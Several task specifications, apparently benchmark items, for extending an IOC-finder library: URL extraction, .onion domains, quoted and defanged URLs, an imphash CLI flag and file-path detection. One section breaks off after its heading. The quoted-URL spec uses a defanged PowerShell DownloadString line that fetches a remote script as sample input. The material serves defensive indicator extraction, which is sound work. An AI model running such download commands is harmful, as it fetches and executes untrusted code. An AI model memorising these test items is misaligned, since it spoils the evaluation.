01 Extracting URLs from Text 503 words · source specification, reworded by GLM-5.3-Flash

Task Specification: Extracting URLs from Text

Overview

Write (or modify) a function that extracts indicators of compromise (IOCs) — URLs specifically — out of an arbitrary text string. The function must parse URLs correctly when they are embedded in HTML attributes, wrapped in brackets/parentheses, and terminated by trailing punctuation.

Public API

Provide a module named ioc_finder that exposes a top-level function:

find_iocs(text: str) -> dict
  • Input: a single string containing arbitrary text.
  • Output: a dictionary. Its keys must include the key 'urls', whose value is a collection of the distinct URL strings found in the input, supporting membership tests via in and length queries via len().

Only the behavior of the 'urls' key is specified in this document.

Required Behavior

URLs inside HTML attributes

When a URL occurs within an HTML attribute value delimited by double quotes, the function must extract only the URL itself — the surrounding quote, tag markup, and other attributes must not be included.

  • Input that contains href="http://fonts.googleapis.com/css?family=Lato:400,700" inside a <link ...> tag must yield the URL http://fonts.googleapis.com/css?family=Lato:400,700. Query strings must be preserved, as must the colons and commas within the query.

  • Input that contains href="https://bit.ly/12345#abcd" inside an <a ...> tag must yield exactly one URL: https://bit.ly/12345#abcd. The fragment (#abcd) must be preserved, and none of the trailing tag content must be captured.

  • Input that contains href="https://bit.ly/12345" must yield exactly one URL: https://bit.ly/12345.

  • Input that contains href="https://bit.ly" (no path) must yield exactly one URL: https://bit.ly.

  • Input that contains href="https://bit.ly/" (a bare trailing slash) must yield exactly one URL: https://bit.ly/. The trailing slash must be preserved.

URLs enclosed in parentheses and brackets

When a URL is enclosed in parentheses ( ... ) or square brackets [ ... ], the bracket characters that enclose it must not be part of the extracted URL. A trailing ) or ] must be stripped from a URL's end.

  • The input (https://i.imgur.com/abc.png) must yield exactly one URL: https://i.imgur.com/abc.png (with no trailing )).

  • The input (https://i.imgur.com/abc.png#abc) must yield exactly one URL: https://i.imgur.com/abc.png#abc. The fragment must be preserved, and the trailing ) must be stripped.

  • The input [https://i.imgur.com/abc.png](https://i.imgur.com/abc.png) (the same URL occurring twice, in the form of a Markdown link) must yield exactly one distinct URL: https://i.imgur.com/abc.png. Duplicate occurrences collapse into a single entry, and neither ] nor ) is included.

  • The input [https://i.imgur.com/abc.png#abc](https://i.imgur.com/abc.png#abc) must yield exactly one distinct URL: https://i.imgur.com/abc.png#abc, with the fragment retained.

Edge Cases and Constraints

  • Deduplication: when identical URLs appear multiple times in the input, they must be represented once in the 'urls' result.
  • Fragment preservation: URL fragments introduced by # form part of the URL and must be retained.
  • Trailing punctuation: a single trailing ) or ] character that immediately follows a URL is not part of the URL and must be removed.
  • Preservation of paths and queries: paths, query strings (including embedded : and , characters), and bare/present trailing slashes must be preserved exactly as they appear.

Task Specification: .onion Domain Parsing Support

Overview

Extend the IOC (Indicator of Compromise) extraction functionality so that .onion domain names are recognized when text is parsed.

Public API

Access to the functionality is provided by a module-level function:

find_iocs(text: str) -> dict

This function must be importable so that find_iocs is available for direct call (as is already the case in the codebase). It accepts a single string argument and returns a dictionary; the values of this dictionary are collections of extracted indicators. The keys relevant to this task are:

  • 'domains' — a collection of the domain names found in the input
  • 'urls' — a collection of the URLs found in the input

Required Behavior

.onion domains must be recognized and extracted as domains. This behavior must work together with the existing IOC parsing so that both standalone .onion domains and .onion domains that appear inside URLs are handled correctly.

Case 1: A standalone .onion domain

When the input text consists of a bare .onion domain, for example:

foo.onion

Exactly one domain must be present in the result, and that domain must be foo.onion.

Case 2: An .onion domain inside a URL

When the input text contains a URL that uses a .onion domain, for example:

http://foo.onion/test

The result must contain the following:

  • There must be exactly one URL, and it must be equal to http://foo.onion/test.
  • There must be exactly one domain, and it must be equal to foo.onion.

In other words, the full URL is captured under 'urls', while the domain component (foo.onion) is captured under 'domains'.

Notes

  • For the purposes of extraction, domain matching should treat .onion as a valid top-level domain.
  • Aside from the interaction described above, no other keys or indicator types are affected by this change.

Goal

Extend the IOC-finding function with a keyword argument parse_domain_from_email_address, which controls whether domain names are extracted from the email addresses found in the input text.

Public API

It must be possible to import the function find_iocs and to call it in the following way:

Task Description

Overview

You must adjust the IOC (Indicator of Compromise) extraction functionality so that URLs are parsed correctly when they are embedded inside quoted strings (single or double quotes) that are followed by additional characters.

Public API

The function that is being tested is:

find_iocs(text: str) -> dict

It can be imported from the package's public interface (that is, from <package> import find_iocs). It accepts a string and returns a dictionary of the extracted indicators. The key that is relevant for this task is 'urls', whose value is a collection (an iterable supporting in membership tests and len()) of extracted URL strings.

Required Behavior

When a URL is enclosed in quotes and immediately followed by non-URL content such as closing parentheses, semicolons, and text that comes afterwards, the function must correctly determine the URL's boundaries.

More precisely, when a URL occurs inside single or double quotes, the URL that is extracted must end at the closing quote and must NOT include any characters that follow the quote (such as ');... or ");...).

In addition, defanged URL notation must be refanged during extraction: the sequence [.], which is used to obfuscate a dot in a hostname, must be normalized back to a literal ..

Specific Cases

  1. For the following input:

    DownloadString('https://hacks4all[.]net/rdp.ps1');g $I

    The result for the 'urls' key must contain exactly one entry: https://hacks4all.net/rdp.ps1.

  2. For the following input:

    DownloadString("https://hacks4all[.]net/rdp.ps1");g $I

    The result for the 'urls' key must contain exactly one entry: https://hacks4all.net/rdp.ps1.

In both of these cases:

  • The 'urls' collection must contain the single URL https://hacks4all.net/rdp.ps1.
  • The total number of extracted URLs must be exactly one.
  • The characters that come after the closing quote (');g $I / ");g $I) must not be included in the extracted URL, and they must not produce any additional URL entries.

Constraints on Current Behavior

The URL extraction behavior that already exists must be preserved. In particular, URLs separated by boundaries other than quotes (e.g., a URL with a fragment identifier that stands alone in the text) must continue to be extracted as a single, complete URL that includes its fragment. The new quote-handling must not break the extraction of otherwise well-formed URLs.

Task Specification: Adding a CLI Flag That Governs Import Hash Parsing

Summary

The ioc_finder package's command-line interface is to be extended with a new option; that option governs whether import hashes (imphashes) get parsed from input text.

The Public API Surface

The CLI exposes its entry point as ioc_finder.cli_find_iocs. This entry point is a Click-based command. Callers invoke it with a positional text argument first, and optional flags come after that argument. Whenever the command runs, a JSON object is emitted to standard output; on success, it exits with code 0.

Keys for the various IOC categories appear in the JSON output, including at least:

  • imphashes — a list of the import hashes that the input contains.
  • md5s — a list of the MD5 hashes that the input contains.

Behavior Requirements

The New --no_import_hashes Option

A boolean flag named --no_import_hashes is to be added to the cli_find_iocs command. When this flag is present, import-hash parsing is disabled.

Default Behavior (Flag Not Present)

Suppose an import hash is present in the input text, written as the keyword imphash followed by whitespace and a 32-character hexadecimal value (for instance, imphash 18ddf28a71089acdbab5038f58044c0a). In that case, the parser must:

  • place the 32-character hex value into the imphashes list;
  • produce an imphashes list that contains exactly that one value (that is, a single import hash gets extracted from that input).
When the --no_import_hashes Flag Is Present

If that same input is processed while the --no_import_hashes flag is set:

  • No import hash gets extracted; the imphashes result must be empty (or absent/falsy).
  • Instead, the 32-character hex value is handled as a plain MD5 hash and shows up in the md5s list.
  • Exactly that one value is what the md5s list must contain.

Additional Notes

  • In the default (non-disabled) case, the value accompanying an imphash keyword gets classified only as an import hash and does not additionally get reported as a generic MD5.
  • Both cases require the command to exit with code 0 and to produce valid JSON on standard output.
20 Adding File Path Detection to the IOC Finder 699 words · source specification, reworded by GLM-5.3-Flash

Task Specification: Adding File Path Detection to the IOC Finder

Summary

The IOC (Indicator of Compromise) extraction functionality that already exists is to be extended so that file paths — both Windows-style and Unix-style — are detected and extracted from arbitrary text input.

Public API

The behavior is exercised by means of this existing function:

from ioc_finder import find_iocs

The function find_iocs(text: str) -> dict accepts a string and returns a dictionary of the extracted indicators.

Changes Required

1. New key in the result

The dictionary that find_iocs returns must always contain a new key:

  • "file_paths" — a list of strings holding every detected file path.

If the input contains no file paths, the key must still be present and map to an empty list ([]). This holds for all inputs, including inputs that contain other kinds of indicators but no file paths.

2. Behavior of file path detection

find_iocs must detect the following forms of file path, and the full matched path string must be included as an element of file_paths.

Windows-style file paths
  • A path prefixed with a drive letter, such as C:\..., that then continues through segments separated by backslashes.
  • Segments may have spaces inside them. For example, the segment Flash Player forms part of a single path.
  • Segments may have spaces that sit adjacent to a backslash. For example, AppData \Local must stay part of the same single path.
  • A path may contain placeholder-style segments that include angle brackets, e.g. <username>.
  • A path may finish with a filename that has an extension (for example shedaudio.exe, flashplayer.exe).
  • A path may terminate with a trailing backslash; if it does, the trailing backslash forms part of the matched result.

Each of the paths below is a complete single match:

  • C:\Users\<username>\AppData\Roaming\Macromedia\Flash Player\macromedia\bin
  • C:\Users\<username>\AppData\Roaming\Macromedia\Flash Player\macromedia\bin\ (trailing backslash kept)
  • C:\Users\<username>\AppData \Local\Microsoft\Windows\shedaudio.exe
  • C:\Windows\11987416.exe
  • C:\Windows\System32\46615275.exe
  • C:\Windows\System32\shedaudio.exe
  • C:\Windows\SysWOW64\f9jwqSbS.exe
Unix-style file paths
  • An absolute path that starts with / and then continues through segments separated by forward slashes.
  • Segments may have spaces in them (for example File System).
  • A path may finish with a filename that has an extension (for example pivtoken.appex).
  • A path may terminate in a trailing slash; if it does, the trailing slash forms part of the matched result.
  • A home-directory path that starts with ~/ (for example ~/Desktop/test.py).
  • Filenames that start with a dot are supported (for example, the final segment .rebootime of /etc/init.d/.rebootime).

Each of the paths below is a complete single match:

  • /Library/Storage/File System/HFS/25cf5d02-e50b-4288-870a-528d56c3cf6e
  • /Library/Storage/File System/HFS/25cf5d02-e50b-4288-870a-528d56c3cf6e/ (trailing slash kept)
  • /Library/Storage/File System/HFS/25cf5d02-e50b-4288-870a-528d56c3cf6e/pivtoken.appex
  • ~/Desktop/test.py
  • /etc/init.d/.rebootime
3. Extracting paths out of surrounding text

A file path must be extracted even in cases where it is embedded within a larger sentence. Non-path words that come before or after the path, separated by whitespace, must not be included in the match. For example, given the text test C:\...\bin is a bad file path, only the path portion (C:\...\bin) is captured; the words surrounding it are excluded.

When a space follows a path and more words come after that space, the match must stop at the path boundary and must not consume the words that follow. In the same way, a trailing slash/backslash that sits immediately before a following space is retained as part of the path, but the following space and the words after it are not.

4. Handling multiple paths

When the input contains multiple distinct file paths (for example across multiple lines), each of them must be extracted as a separate element of file_paths. Content that is not itself a path and is interspersed between the paths (for example registry keys like HKEY_LOCAL_MACHINE\Software\..., or descriptive headings) must not be captured as file paths.

For the multi-line Windows example, file_paths must contain exactly the six drive-letter paths listed in section 2, and nothing else.

Restrictions

  • None of the keys already present in the returned dictionary may be removed or altered; the "file_paths" key is the only one that may be added.
  • All indicator types that were supported previously must continue to work unchanged.
